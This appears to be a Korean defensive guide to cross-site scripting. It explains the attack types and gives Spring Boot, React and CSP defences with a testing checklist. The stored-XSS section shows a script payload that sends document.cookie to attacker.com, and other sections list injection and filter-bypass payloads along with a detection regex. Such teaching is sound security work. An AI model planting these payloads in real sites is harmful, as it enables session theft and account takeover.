# XSS (Cross-Site Scripting) 완전 정복 가이드

## 목차

1. [XSS란 무엇인가](#1-xss란-무엇인가)
2. [XSS 공격 유형](#2-xss-공격-유형)
3. [공격 동작 원리](#3-공격-동작-원리)
4. [XSS로 할 수 있는 것들](#4-xss로-할-수-있는-것들)
5. [대응 전략](#5-대응-전략)
6. [Spring Boot에서의 XSS 방어](#6-spring-boot에서의-xss-방어)
7. [프론트엔드(React/Vue)에서의 XSS 방어](#7-프론트엔드reactvue에서의-xss-방어)
8. [CSP (Content Security Policy)](#8-csp-content-security-policy)
9. [체크리스트](#9-체크리스트)

---

## 1. XSS란 무엇인가

**XSS(Cross-Site Scripting)** 는 공격자가 악성 스크립트를 웹 페이지에 삽입하여, 다른 사용자의 브라우저에서 해당 스크립트가 실행되도록 하는 공격이다.

> "신뢰할 수 있는 사이트에서 온 콘텐츠"라는 브라우저의 신뢰를 역이용한다.

### 핵심 개념

- **피해자**: 악성 스크립트가 실행되는 브라우저의 사용자 (피해자)
- **공격자**: 악성 스크립트를 삽입한 사람
- **실행 컨텍스트**: 스크립트는 **피해자의 브라우저**에서 실행된다

```
공격자 → 악성 스크립트 삽입 → 서버/URL
피해자 → 해당 페이지 접속
피해자 브라우저 → 악성 스크립트 실행 (쿠키, 토큰, 개인정보 탈취)
```

### 왜 "Cross-Site"인가

스크립트가 신뢰할 수 있는 사이트(`example.com`)에 심어지고, 그 사이트의 권한으로 실행되기 때문이다.
브라우저 입장에서 `example.com`에서 온 스크립트이므로 `example.com`의 쿠키, DOM, localStorage에 접근 가능하다.

---

## 2. XSS 공격 유형

### 2-1. Stored XSS (저장형) — 가장 위험

악성 스크립트가 **서버 DB에 저장**되어, 해당 페이지를 방문하는 모든 사용자에게 실행된다.

```
공격자: 댓글창에 아래 내용 입력
<script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>

→ DB에 저장
→ 다른 사용자가 해당 댓글 페이지 방문
→ 브라우저가 스크립트 실행
→ 쿠키 탈취 완료
```

**발생 경로**: 게시판, 댓글, 프로필, 상품 설명, 채팅 메시지

### 2-2. Reflected XSS (반사형)

악성 스크립트가 URL에 포함되어, **서버 응답에 그대로 반사(Reflect)** 되어 실행된다.
DB에 저장되지 않고 1회성으로 동작한다.

```
공격자가 피해자에게 아래 링크를 전송:
https://example.com/search?q=<script>document.cookie 탈취 코드</script>

서버가 검색어를 HTML에 그대로 출력:
<p>검색 결과: <script>document.cookie 탈취 코드</script></p>

→ 브라우저가 스크립트 실행
```

**발생 경로**: 검색창, 에러 메시지에 입력값 반영, 이메일 링크

### 2-3. DOM-based XSS

서버와 무관하게 **클라이언트 사이드 JavaScript가 DOM을 조작**할 때 발생한다.
서버 응답은 정상이지만, 브라우저의 JS 코드가 URL 파라미터 등을 그대로 DOM에 삽입한다.

```javascript
// 취약한 코드 예시
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = '안녕하세요, ' + name; // 위험!

// URL: https://example.com/?name=<img src=x onerror=alert(1)>
```

**발생 경로**: SPA(React, Vue)에서 URL 파라미터를 innerHTML/document.write에 직접 삽입

---

## 3. 공격 동작 원리

### HTML 컨텍스트별 XSS 주입 방식

XSS는 스크립트가 삽입되는 **HTML 컨텍스트**에 따라 페이로드가 달라진다.

```html
<!-- 1. HTML 태그 내부 컨텍스트 -->
<div>사용자 입력: [여기에 삽입]</div>
공격 페이로드: <script>alert(1)</script>

<!-- 2. HTML 속성 컨텍스트 -->
<input value="[여기에 삽입]">
공격 페이로드: " onmouseover="alert(1)

<!-- 3. URL 속성 컨텍스트 -->
<a href="[여기에 삽입]">링크</a>
공격 페이로드: javascript:alert(1)

<!-- 4. JavaScript 컨텍스트 -->
<script>var user = "[여기에 삽입]";</script>
공격 페이로드: "; alert(1); var x = "

<!-- 5. CSS 컨텍스트 -->
<style>body { background: [여기에 삽입] }</style>
공격 페이로드: red; } body { background: url(javascript:alert(1))
```

---

## 4. XSS로 할 수 있는 것들

```
쿠키 탈취         → 세션 하이재킹 (계정 탈취)
LocalStorage 탈취  → JWT 토큰 탈취
키로거            → 입력한 비밀번호, 카드번호 수집
화면 캡처         → 사용자 화면 전송
자동 폼 제출      → CSRF 공격 보조
피싱 페이지 삽입   → 가짜 로그인 폼 노출
내부망 포트 스캔  → 내부 서비스 정보 수집
악성코드 다운로드  → 드라이브-바이 다운로드
```

---

## 5. 대응 전략

XSS 방어의 핵심은 **"입력을 신뢰하지 말고, 출력 시 항상 이스케이프하라"** 이다.

### 5-1. 출력 이스케이프 (가장 중요)

HTML에 데이터를 출력할 때 반드시 이스케이프 처리한다.

| 원본 문자 | 이스케이프 결과 |
|---------|--------------|
| `<`     | `&lt;`       |
| `>`     | `&gt;`       |
| `"`     | `&quot;`     |
| `'`     | `&#x27;`     |
| `&`     | `&amp;`      |
| `/`     | `&#x2F;`     |

```java
// 이스케이프 없이 출력 (위험)
response.getWriter().write("<p>" + userInput + "</p>");

// 이스케이프 후 출력 (안전)
response.getWriter().write("<p>" + HtmlUtils.htmlEscape(userInput) + "</p>");
```

### 5-2. 입력 검증 (Input Validation)

서버에서 입력값을 받을 때 허용된 문자만 통과시킨다.

```java
// 전화번호: 숫자와 하이픈만 허용
if (!phone.matches("^[0-9\\-]+$")) {
    throw new InvalidInputException("잘못된 전화번호 형식");
}

// 이름: 한글, 영문, 공백만 허용
if (!name.matches("^[가-힣a-zA-Z ]+$")) {
    throw new InvalidInputException("잘못된 이름 형식");
}
```

### 5-3. 화이트리스트 기반 HTML 허용 (Sanitization)

HTML 입력이 필요한 경우(리치 텍스트 에디터), 허용할 태그만 명시한다.

```java
// Jsoup 라이브러리 사용
String safe = Jsoup.clean(userHtml, Whitelist.basicWithImages());

// 또는 OWASP Java HTML Sanitizer
PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
String safeHtml = policy.sanitize(userHtml);
```

### 5-4. HttpOnly 쿠키

쿠키에 `HttpOnly` 플래그를 설정하면 JS에서 `document.cookie`로 접근 불가능하다.

```java
// Spring Boot
ResponseCookie cookie = ResponseCookie.from("sessionId", value)
    .httpOnly(true)   // JS 접근 차단
    .secure(true)     // HTTPS에서만 전송
    .sameSite("Strict") // CSRF 방어
    .path("/")
    .build();
```

```yaml
# application.yml
server:
  servlet:
    session:
      cookie:
        http-only: true
        secure: true
```

### 5-5. JWT는 HttpOnly 쿠키에 저장

```
localStorage → JS로 접근 가능 → XSS 취약
sessionStorage → JS로 접근 가능 → XSS 취약
HttpOnly Cookie → JS 접근 불가 → XSS 안전 (단, CSRF 주의)
```

---

## 6. Spring Boot에서의 XSS 방어

### 6-1. 의존성 추가

```kotlin
// build.gradle.kts
dependencies {
    implementation("org.jsoup:jsoup:1.17.2")
    implementation("com.googlecode.owasp-java-html-sanitizer:owasp-java-html-sanitizer:20240325.1")
}
```

### 6-2. XSS 필터 구현

```java
// XssRequestWrapper.java
public class XssRequestWrapper extends HttpServletRequestWrapper {

    public XssRequestWrapper(HttpServletRequest request) {
        super(request);
    }

    @Override
    public String getParameter(String name) {
        return sanitize(super.getParameter(name));
    }

    @Override
    public String[] getParameterValues(String name) {
        String[] values = super.getParameterValues(name);
        if (values == null) return null;
        return Arrays.stream(values)
                .map(this::sanitize)
                .toArray(String[]::new);
    }

    @Override
    public String getHeader(String name) {
        return sanitize(super.getHeader(name));
    }

    private String sanitize(String value) {
        if (value == null) return null;
        return Jsoup.clean(value, Safelist.none()); // 모든 HTML 태그 제거
    }
}
```

```java
// XssFilter.java
@Component
@Order(1)
public class XssFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        chain.doFilter(new XssRequestWrapper((HttpServletRequest) request), response);
    }
}
```

### 6-3. Jackson XSS 필터 (JSON 요청 본문)

Query Parameter와 달리 JSON Body는 별도 처리가 필요하다.

```java
// HtmlCharacterEscapes.java - Jackson 커스텀 이스케이프
public class HtmlCharacterEscapes extends CharacterEscapes {

    private final int[] asciiEscapes;

    public HtmlCharacterEscapes() {
        asciiEscapes = CharacterEscapes.standardAsciiEscapesForJSON();
        asciiEscapes['<'] = CharacterEscapes.ESCAPE_CUSTOM;
        asciiEscapes['>'] = CharacterEscapes.ESCAPE_CUSTOM;
        asciiEscapes['&'] = CharacterEscapes.ESCAPE_CUSTOM;
        asciiEscapes['"'] = CharacterEscapes.ESCAPE_CUSTOM;
        asciiEscapes['\''] = CharacterEscapes.ESCAPE_CUSTOM;
    }

    @Override
    public int[] getEscapeCodesForAscii() {
        return asciiEscapes;
    }

    @Override
    public SerializableString getEscapeSequence(int ch) {
        return switch (ch) {
            case '<' -> new SerializedString("&lt;");
            case '>' -> new SerializedString("&gt;");
            case '&' -> new SerializedString("&amp;");
            case '"' -> new SerializedString("&quot;");
            case '\'' -> new SerializedString("&#x27;");
            default -> null;
        };
    }
}
```

```java
// JacksonConfig.java
@Configuration
public class JacksonConfig {

    @Bean
    public ObjectMapper objectMapper() {
        ObjectMapper mapper = new ObjectMapper();
        mapper.getFactory().setCharacterEscapes(new HtmlCharacterEscapes());
        return mapper;
    }
}
```

### 6-4. Spring Security 헤더 설정

```java
// SecurityConfig.java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                // X-XSS-Protection 헤더 (구형 브라우저용, 현대 브라우저는 CSP 사용)
                .xssProtection(xss -> xss
                    .headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK)
                )
                // X-Content-Type-Options: nosniff (MIME 타입 스니핑 방지)
                .contentTypeOptions(Customizer.withDefaults())
                // CSP 설정
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self'; " +
                        "script-src 'self'; " +
                        "style-src 'self' 'unsafe-inline'; " +
                        "img-src 'self' data:; " +
                        "font-src 'self'; " +
                        "connect-src 'self'; " +
                        "frame-ancestors 'none';"
                    )
                )
            );
        return http.build();
    }
}
```

### 6-5. Validator를 이용한 입력 검증

```java
// 커스텀 어노테이션
@Target(ElementType.FIELD)
@Retention(RetentionPolicy.RUNTIME)
@Constraint(validatedBy = NoScriptValidator.class)
public @interface NoScript {
    String message() default "스크립트 태그는 허용되지 않습니다.";
    Class<?>[] groups() default {};
    Class<? extends Payload>[] payload() default {};
}

// Validator 구현
public class NoScriptValidator implements ConstraintValidator<NoScript, String> {

    private static final Pattern SCRIPT_PATTERN = Pattern.compile(
        "<script[^>]*>.*?</script>|javascript:|on\\w+\\s*=",
        Pattern.CASE_INSENSITIVE | Pattern.DOTALL
    );

    @Override
    public boolean isValid(String value, ConstraintValidatorContext context) {
        if (value == null) return true;
        return !SCRIPT_PATTERN.matcher(value).find();
    }
}

// 사용 예시
public record CreateCommentRequest(
    @NotBlank
    @Size(max = 500)
    @NoScript
    String content
) {}
```

---

## 7. 프론트엔드(React/Vue)에서의 XSS 방어

### 7-1. innerHTML 사용 금지

```jsx
// 위험 (React)
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// 안전 (텍스트로 렌더링)
<div>{userContent}</div>

// HTML이 꼭 필요하면 sanitize 후 사용
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />
```

```javascript
// 위험 (DOM API)
element.innerHTML = userInput;
document.write(userInput);

// 안전
element.textContent = userInput;
```

### 7-2. URL 검증

```javascript
// 위험: javascript: 프로토콜 허용
<a href={userUrl}>링크</a>

// 안전: URL 검증 후 사용
function isSafeUrl(url) {
    try {
        const parsed = new URL(url);
        return ['http:', 'https:'].includes(parsed.protocol);
    } catch {
        return false;
    }
}

<a href={isSafeUrl(userUrl) ? userUrl : '#'}>링크</a>
```

### 7-3. DOMPurify 라이브러리

리치 텍스트가 필요한 경우 반드시 DOMPurify를 사용한다.

```bash
npm install dompurify
npm install @types/dompurify  # TypeScript
```

```javascript
import DOMPurify from 'dompurify';

// 기본 사용
const clean = DOMPurify.sanitize(dirtyHtml);

// 설정 커스터마이징
const clean = DOMPurify.sanitize(dirtyHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false,
});
```

---

## 8. CSP (Content Security Policy)

CSP는 브라우저에게 **어떤 출처의 리소스만 로드/실행할 수 있는지** 명시하는 HTTP 헤더다.
XSS 공격이 성공하더라도 외부로 데이터를 전송하거나 외부 스크립트 로드를 차단한다.

### CSP 헤더 예시

```
Content-Security-Policy:
  default-src 'self';                        ← 기본: 같은 출처만
  script-src 'self' https://cdn.example.com; ← JS: 자신 + 허용된 CDN만
  style-src 'self' 'unsafe-inline';          ← CSS: 인라인 허용 (필요시)
  img-src 'self' data: https:;               ← 이미지: 자신 + data URI + HTTPS
  connect-src 'self' https://api.example.com;← fetch/XHR: 자신 + API 서버만
  font-src 'self';                           ← 폰트: 자신만
  frame-ancestors 'none';                    ← iframe 삽입 차단 (Clickjacking 방어)
  base-uri 'self';                           ← base 태그 조작 방지
  form-action 'self';                        ← 폼 전송: 자신만
```

### Nonce 방식 (인라인 스크립트 허용)

```java
// 서버에서 매 요청마다 Nonce 생성
String nonce = Base64.getEncoder().encodeToString(
    SecureRandom.getInstanceStrong().generateSeed(16)
);

// CSP 헤더에 nonce 포함
response.setHeader("Content-Security-Policy",
    "script-src 'self' 'nonce-" + nonce + "'");

// HTML에서 nonce 속성 사용
// <script nonce="서버에서준nonce">...</script>
```

### CSP 위반 보고

```
Content-Security-Policy:
  default-src 'self';
  report-uri /csp-violation-report;  ← 위반 시 리포트 전송
```

---

## 9. 체크리스트

### 백엔드 체크리스트

- [ ] 모든 사용자 입력에 대해 서버 사이드 검증 수행
- [ ] HTML 출력 시 이스케이프 처리 (`HtmlUtils.htmlEscape`)
- [ ] JSON 응답에 Jackson XSS 이스케이프 설정
- [ ] XSS 필터 적용 (QueryParam, PathVariable)
- [ ] HttpOnly + Secure 쿠키 설정
- [ ] JWT는 HttpOnly 쿠키에 저장
- [ ] Content-Security-Policy 헤더 설정
- [ ] X-Content-Type-Options: nosniff 설정
- [ ] 리치 텍스트 입력 시 OWASP Java HTML Sanitizer 사용
- [ ] 에러 메시지에 입력값 그대로 반영 금지

### 프론트엔드 체크리스트

- [ ] `innerHTML`, `document.write` 사용 금지
- [ ] React `dangerouslySetInnerHTML` 최소화 → 필요시 DOMPurify 적용
- [ ] URL 파라미터를 DOM에 직접 삽입 금지
- [ ] 외부 URL 사용 시 프로토콜 검증 (`http:`, `https:` 만 허용)
- [ ] `eval()`, `new Function()` 사용 금지
- [ ] CSP 설정으로 `unsafe-inline`, `unsafe-eval` 제거

### 테스트 체크리스트

- [ ] 기본 XSS 페이로드 테스트: `<script>alert(1)</script>`
- [ ] 이벤트 핸들러 주입 테스트: `<img src=x onerror=alert(1)>`
- [ ] URL 인젝션 테스트: `javascript:alert(1)`
- [ ] HTML 인코딩 우회 테스트: `&lt;script&gt;`
- [ ] 대소문자 혼합 우회 테스트: `<ScRiPt>alert(1)</ScRiPt>`
- [ ] Stored XSS: DB에 저장 후 다른 사용자로 조회 테스트

---

## 참고 자료

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP DOM-based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Lab](https://portswigger.net/web-security/cross-site-scripting)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [DOMPurify GitHub](https://github.com/cure53/DOMPurify)